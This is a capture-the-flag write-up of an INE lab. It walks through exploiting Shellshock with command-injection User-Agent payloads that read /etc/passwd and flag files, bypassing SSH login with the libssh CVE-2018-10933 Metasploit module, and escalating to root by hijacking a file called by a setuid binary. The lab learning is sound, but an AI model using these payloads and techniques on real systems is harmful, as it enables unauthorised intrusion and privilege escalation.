
# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework



**Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.



Okay lets start initially with target1.ine.local for this and flag 2 :)

The first thing I always tend to do for these CTF's is start with the trusty nmap scan to get an idea on the target and what we are working with!

nmap -sSv -o -p- target1.ine.local

We currently have an apache web server version 2.4.6 which is always handy to know.


![](Screenshots/nmap%20scan%20on%20target1.ine.local.png)


Okay, lets have a look at the website to see what it's looking like and to see if we can get any clues on how it looks/interacts..

Oh interesting. When I open up the website on firefox the URL automatically shows /browser.cgi .. Something to bare in mind for down the line as this may be something to exploit


![](Screenshots/target1.ine.local%20website.png)


Just to confirm my suspicion on the target, I'm going to run the shellshock script available within nmap just to test if this browser's is vulnerable to shell shock.

nmap --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local

Boom, just as I suspected, the target is VULNERABLE to shellshock.

![](Screenshots/nmap%20shellshock%20script.png)


Now that we know that, Let's get burp suite up and running so we can look at intercepting the requests to look a bit more in depth of this bash vulnerability running on this server.

Foxy Proxy is downloaded as a firefox extension already so it is just a case of selecting the burp option and then opening up burpsuite on the local machine.

Intercept on and refresh the web page so we can catch this request.

When it has refreshed it has captured the request which is awesome, lets send this to the repeater to alter the contents.


![](Screenshots/Burpsuite%20send%20to%20repeater.png)


In the repeater this is where we take advantage of this vulnerability.

Within the User-Agent field we use the following:

() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

Since the bash vulnerability lies within executing commands after the special character, we are effectively using a bash shell to print out the commands in the response from the server

The command used is just to show that it works and by showing all the users on the system.


![](Screenshots/Shellshock%20done%20for%20etc%20passwd.png)


by changing the end of the command to "ls -l /" this will print the contents of the root directory.

() { :; }; echo; echo; /bin/bash -c 'ls -l /'

Boom there's the flag.


![](Screenshots/showing%20the%20flag%20via%20ls%20-l.png)


Let's show this flag and get it submitted! First flag done!

() { :; }; echo; echo; /bin/bash -c 'cat /flag.txt'

![](Screenshots/FLAG%201%20CAPTURED.png)














**Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.


Well since we are already here checking out the root directory, It's asking to check the /opt/apache/htdocs/ for a small surprise so let's see what is happening here!

Not going to lie, this cheeky devil took a bit more time than I would've liked to admit, admittedly I was silly to only use ls -l in the command, after reading the flag description carefully, I kept thinking "hidden?"

Well here's the command that solved all my issues..

() { :; }; echo; echo; /bin/bash -c 'ls -al /opt/apache/htdocs/'

Honestly, feel silly for not even clicking sooner ahaha!


![](Screenshots/ls%20-al%20on%20opt%20apache%20htdocs%20directory.png)


Good things with these CTF's is they really get you thinking!

() { :; }; echo; echo; /bin/bash -c 'cat /opt/apache/htdocs/.flag.txt'

Get flag 2 in the bag!

![](Screenshots/FLAG%202%20CAPTURED.png)


That's enough from target1.ine.local for just now, lets get on to flag 3 & flag 4.














**Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

The libssh_auth_bypass CVE-2018-10933 is a vulnerability which allows attackers to bypass authentication by sending a "USERAUTH_SUCCESS" message instead of "USERAUTH_REQUEST" which affects versions 0.6.0 - -.7.5 & 0.8.0 - 0.8.3.

Right okay judging from the hint in this description it may be a metasploit module we need to use in this.

There's a dead hint giveaway libssh.. I'm looking for SSH information here, so port 22.

Let's get into it by running an nmap scan.

nmap -sSV -O -p- target2.ine.local

Just as suspected, port 22 open with SSH. Also with the affected version of 0.8.3. This is the vulnerability we will be exploiting.

![](Screenshots/nmap%20scan%20on%20target2.ine.local.png)



I wanted to get some more information on the SSH service running on the target, I ran 2 other nmap scripts just to get an idea. I was more interested in the authentication method to see if it is key based or password based.

nmap --script=ssh-auth-methods target2.ine.local
nmap --script=ssh-hostkey target2.ine.local

Password based! Already I'm thinking brute force! Firstly, some enumeration is key!

![](Screenshots/nmap%20scripts%20on%20target2.png)



So we now need to get some information about what users are actually available on this for SSH, I want to do some more enumeration. I'm going to use a metasploit enum users module.

auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target2.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set CHECK_FALSE false
run

Now we have some usernames to note sysadmin and administrator sound interesting! The hint to work with was user. Let's bare that in mind. 

![](Screenshots/msf%20ssh%20enum%20users.png)


now lets switch over to the hint it was giving about using the "libssh_auth_bypass" module..

The main options to set here are:

set RHOSTS target2.ine.local
set SPAWN_PTY true
run

We now have a nice little session opened there nicely for us!


![](Screenshots/SSH%20exploit%20SUCCESS%20showing%20sessions.png)



Okay so connected to the target currently and can see I am the "user" account, which is handy, after spawning a bash shell we can have a rummage about, the description mentioned "users home directory".

whoami
/bin/bash -i
cd home
cd user

we have now been able to locate the flag!  Get it submitted!

cat flag.txt

![](Screenshots/FLAG%203%20CAPTURED.png)












**Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.


Now I've got to admit, the welcome highlighted in red was more of a stick out for me than the last flag! The description asks to look into the restricted areas and in the /root directory. 

I really want to get more info on this..

ls -al

I knew it!! After listing the permissions on the files, this is an executable with setuid attached to it.. running as the root user!! This appears to be a small misconfiguration which we will absolutely be using to escalate privileges!

Notice the greetings highlighted in green as well ;)


![](Screenshots/setuid%20spotted.png)



Okay, so now here is the interesting part.. the welcome executable calls on the greetings file we see in the same directory.. This is definitely our attack vector for getting to root!

![](Screenshots/strings%20welcome.png)


So now what we want to do is remove this file so we can create a new file with a bash shell in there so that when we execute welcome, it should give us root.

rm greetings
cp /bin/bash greetings
./welcome 

And there we go.. successfully we have escalated to root privileges on the target2 machine!

![](Screenshots/PRIV%20ESC%20SUCCESS.png)



Now the final part, let's get to the /root directory to inspect whats going on.

cd /
cd root

There it is. Sweet Sweet flag.txt, get that open and submitted. FLAG 4 CAPTURED!


![](Screenshots/FLAG%204%20CAPTURED.png)




All flags captured! I really took my time with this one (whilst making a few cups of tea) :D


![](Screenshots/All%20flags%20captured.png)

